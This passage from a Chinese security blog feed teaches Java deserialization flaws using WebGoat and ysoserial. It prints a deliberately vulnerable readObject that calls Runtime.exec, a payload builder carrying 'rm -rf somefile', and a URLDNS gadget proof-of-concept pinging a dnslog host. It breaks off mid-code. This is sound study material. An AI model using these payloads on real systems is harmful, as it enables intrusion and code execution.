    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="JWT" scheme="https://j3f5.github.io/tags/JWT/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-07T03:39:32.000Z</published>
    <updated>2023-06-07T03:39:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反序列化"><a class="markdownIt-Anchor" href="#java反序列化"></a> JAVA反序列化</h1><h2 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h2><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png" alt="JAVA反序列化基础" style="zoom:80%;" /><h3 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化"></a> 序列化与反序列化</h3><p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，<code>ObjectOutputStream</code>类的 <code>writeObject() </code>方法可以实现序列化。</p><p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，<code>ObjectInputStream </code>类的 <code>readObject() </code>方法用于反序列化。</p><p>序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的<strong>实现多平台之间的通信、对象持久化存储</strong>。</p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image-20230606110322164.png" alt="image-20230606110322164" style="zoom:50%;" /><p><strong>例子：</strong></p><blockquote><p>最常见的反序列化情况便是服务器的SESSION，当有大量用户并发访问，就有可能出现庞大数量的SESSION 对象，内存显然不够用，于是Web 容器便会将SESSION 先序列化到硬盘中，等需要使用时，再将保存在硬盘中的对象还原到内存中，这个存储再拿出来的过程便是序列化和反序列化的过程。</p></blockquote><h3 id="漏洞成因与危害"><a class="markdownIt-Anchor" href="#漏洞成因与危害"></a> 漏洞成因与危害</h3><p><strong>成因：Java 程序没有对反序列化生成的对象的类型做限制</strong>。在 Java 中反序列化漏洞之所以比较严重的原因之一是：Java 存在大量的公用库，例如Apache Commons Collections。而这其中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，他只是手段与途径。</p><p><strong>危害</strong>：<strong>任意代码执行，获取SHELL，对服务器进行破坏</strong>。</p><h3 id="涉及函数"><a class="markdownIt-Anchor" href="#涉及函数"></a> 涉及函数</h3><p><strong>ObjectOutputStream 类</strong></p><ul><li><strong>writeObject</strong>() 方法可以对参数指定的obj 对象进行<strong>序列化</strong>操作，并将得到的字节序列写到目标输出流中。</li></ul><p><strong>ObjectInputStream 类</strong></p><ul><li><strong>ReadObject</strong>()方法则是从源输入流中读取字节序列，再将其<strong>反序列化</strong>为对象并返回。</li></ul><p>可以序列化反序列化的类都需要声明接口Serializable</p><h3 id="漏洞利用的条件"><a class="markdownIt-Anchor" href="#漏洞利用的条件"></a> 漏洞利用的条件</h3><h4 id="存在利用链"><a class="markdownIt-Anchor" href="#存在利用链"></a> 存在利用链</h4><p>在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget chain，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。</p><h4 id="存在触发点"><a class="markdownIt-Anchor" href="#存在触发点"></a> 存在触发点</h4><p>程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。需要存在入口以及触发漏洞的函数。</p><h3 id="序列化字符串"><a class="markdownIt-Anchor" href="#序列化字符串"></a> 序列化字符串</h3><p>下方的特征可以作为序列化的标志参考：</p><ul><li>一段以<strong>rO0AB</strong>开头，基本可以确认是JAVA序列化字符串以<strong>base64</strong>加密的数据。<ul><li>序列化+base64</li></ul></li><li>一段以<strong>aced</strong>开头，基本就是JAVA序列化的16进制数据</li></ul><h2 id="测试用例webgoat与ysoserial"><a class="markdownIt-Anchor" href="#测试用例webgoat与ysoserial"></a> 测试用例（WebGoat与ysoserial）</h2><h3 id="基础反序列化"><a class="markdownIt-Anchor" href="#基础反序列化"></a> 基础反序列化</h3><p>著名含反序列化漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(is);</span><br><span class="line"><span class="type">AcmeObject</span> <span class="variable">acme</span> <span class="operator">=</span> (AcmeObject)ois.readObject();</span><br></pre></td></tr></table></figure><p>它期待着一个AcmeObject对象，但它会在铸造发生之前执行readObject()。如果攻击者找到了在readObject()中实现危险操作的适当的类，他可以将该对象序列化，并强迫受攻击的应用程序执行这些操作。攻击者需要在classpath中找到一个支持序列化并在readObject()上有危险实现的类。【也就是利用链】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line">        <span class="keyword">private</span> String taskAction;</span><br><span class="line">        <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>();</span><br><span class="line">                <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">                <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">                <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream stream )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//deserialize data so taskName and taskAction are available</span></span><br><span class="line">                stream.defaultReadObject();</span><br><span class="line">                <span class="comment">//blindly run some code. #code injection</span></span><br><span class="line">                Runtime.getRuntime().exec(taskAction);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果上图所示的java类存在，攻击者可以将该对象序列化并获得远程代码执行。利用链如下：用户定义了一个VulnerableTaskHolder对象Go，然后传入对应的参数值，对我们构造的恶意对象进行序列化，将会出发<code>Runtime.getRuntime().exec(taskAction);</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">VulnerableTaskHolder</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;delete all&quot;</span>, <span class="string">&quot;rm -rf somefile&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">oos.writeObject(go);</span><br><span class="line">oos.flush();</span><br><span class="line"><span class="type">byte</span>[] exploit = bos.toByteArray();</span><br></pre></td></tr></table></figure><h3 id="ysoserial样例分析urldns样例"><a class="markdownIt-Anchor" href="#ysoserial样例分析urldns样例"></a> ysoserial样例分析（URLDNS样例）</h3><p>这个是<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%EF%BC%8C%E6%8C%89%E7%85%A7%E5%88%AB%E4%BA%BA%E7%9A%84payload%E6%9D%A5%E5%AD%A6%E4%B9%A0%E6%9F%90%E4%B8%AA%E6%A8%A1%E5%9D%97%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%82">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java的一个项目，按照别人的payload来学习某个模块是否存在反序列化漏洞。</a></p><p>主要代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(String url) throws Exception &#123;</span><br><span class="line">    URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line">    HashMap ht = new HashMap();</span><br><span class="line">    URL u = new URL((URL)null, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);</span><br><span class="line">    return ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面涉及几个类，一个是URL一个是HashMap。先循序渐进，看类与方法。怎么看类？找<code>readObject</code>和<code>writeObject</code>类看到两个个类，HashMap有readObject方法。</p><p>看到一个方法<code>put</code>，那就ctrl+b进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有两个函数，一个<code>putVal</code>，一个是<code>hash</code>，现在进去<code>putVal</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">                   boolean evict) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">        if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">            n = (tab = resize()).length;</span><br><span class="line">....</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没啥，涉及到的函数都是与树相关的操作，就是存储吧，所以返回<code>hash</code>方法，这个方法传入的是<code>key</code>的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key是URL的，所以去到URL类看看<code>hashCode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要<code>hashCode==-1</code>才能执行后面的<code>hashCode</code>函数，跟进<code>hashcode</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>InetAddress addr = getHostAddress(u)</code>可以获取URL的IP地址就是域名解析。</p><p>我其实跑偏了：正确是先找<code>readObject</code>。</p><p>当我们传入序列化的数据时，因为<code>HashMap</code>有<code>readObject</code>函数，所以跟进一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">.......</span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现<code>putVal(hash(key), key, value, false, false);</code>这个，上面已经分析过。所以</p><p>所以利用链就是：</p><blockquote><ol><li>存在<code>URL</code>和<code>Hashmap</code></li><li><code>Hashmap</code>重写了<code>readObject</code>方法，里面，使用<code>putVal</code>函数的时候会调用<code>hash</code>函数对URL进行<code>hashCode</code>处理</li><li><code>URL</code>的<code>hashcode</code>函数调用<code>getHostAddress</code>进行域名解析</li></ol></blockquote><p>所以现在模仿写一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">/* ERROR</span></span><br><span class="line"><span class="comment">        1. Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens</span></span><br><span class="line"><span class="comment">        -- Java version is too high</span></span><br><span class="line"><span class="comment">        2. has been compiled by a more recent version of the Java Runtime (class file version 52.0)</span></span><br><span class="line"><span class="comment">        -- Java version is too high. Please reset the project structure and the configuration</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sUrl</span> <span class="operator">=</span> <span class="string">&quot;http://ib7pmo.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">uUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(sUrl);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">// 这里获取URL类的字段，这里列举两种方法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        <span class="comment">// Field field = uUrl.getClass().getDeclaredField(&quot;hashCode&quot;);</span></span><br><span class="line">        <span class="comment">// 因为是私有方法，所以这里设置能更改</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 为了不混淆，这里put方法也可以造成dnslog的，所以设置2</span></span><br><span class="line">        field.set(uUrl, <span class="number">2</span>);</span><br><span class="line">        hashMap.put(uUrl, <span class="string">&quot;J3ff&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 存起来了，后面就可以用了</span></span><br><span class="line">        field.set(uUrl, -<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 开始序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.exp&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.exp&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="webgoat-反序列化漏洞分析-and-ysoserial的使用"><a class="markdownIt-Anchor" href="#webgoat-反序列化漏洞分析-and-ysoserial的使用"></a> webgoat 反序列化漏洞分析 and ysoserial的使用</h3><p>现在查到这个有漏洞的类代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDeserializationTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InsecureDeserializationTask</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String token)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 对接收到的token进行了一波敏感字符替换变成b64token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64token</span> <span class="operator">=</span> token.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;+&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="type">long</span> before;<span class="type">long</span> after;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            label71: &#123;</span><br><span class="line">                <span class="comment">// 对b64token解码过后进行了readObject()反序列化操作（第16行）</span></span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(b64token)));</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            before = System.currentTimeMillis();</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                <span class="comment">// 看这个对象是不是VulnerableTaskHolder的实例</span></span><br><span class="line">                <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> VulnerableTaskHolder)) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">                            after = System.currentTimeMillis();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 看执行了多久，时间长了就算成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> (<span class="type">int</span>)(after - before); <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>就如上面代码所示，我们应该看VulnerableTaskHolder类，里面的readObject()反序列化操作到底有什么可以利用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableTaskHolder</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String taskName;</span><br><span class="line">  <span class="keyword">private</span> String taskAction;</span><br><span class="line">  <span class="keyword">private</span> LocalDateTime requestedExecutionTime;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">VulnerableTaskHolder</span><span class="params">(String taskName, String taskAction)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.taskName = taskName;</span><br><span class="line">    <span class="built_in">this</span>.taskAction = taskAction;</span><br><span class="line">    <span class="built_in">this</span>.requestedExecutionTime = LocalDateTime.now();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;VulnerableTaskHolder [taskName=&quot;</span> + taskName + <span class="string">&quot;, taskAction=&quot;</span> + taskAction + <span class="string">&quot;, requestedExecutionTime=&quot;</span> + requestedExecutionTime + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 执行反序列化操作</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 反序列化中的taskName和taskAction属性都是可以利用的</span></span><br><span class="line">    stream.defaultReadObject();</span><br><span class="line">    <span class="comment">// 对数据进行操作的记录 ...</span></span><br><span class="line"><span class="comment">// 对象误操作 ...</span></span><br><span class="line">    <span class="comment">// 注释：这里的条件是为了防止你把山羊完全毁掉</span></span><br><span class="line">    <span class="keyword">if</span> ((taskAction.startsWith(<span class="string">&quot;sleep&quot;</span>) || taskAction.startsWith(<span class="string">&quot;ping&quot;</span>)) &amp;&amp; taskAction.length() &lt; <span class="number">22</span>) &#123;</span><br><span class="line">      log.info(<span class="string">&quot;about to execute: &#123;&#125;&quot;</span>, taskAction);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(taskAction);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span 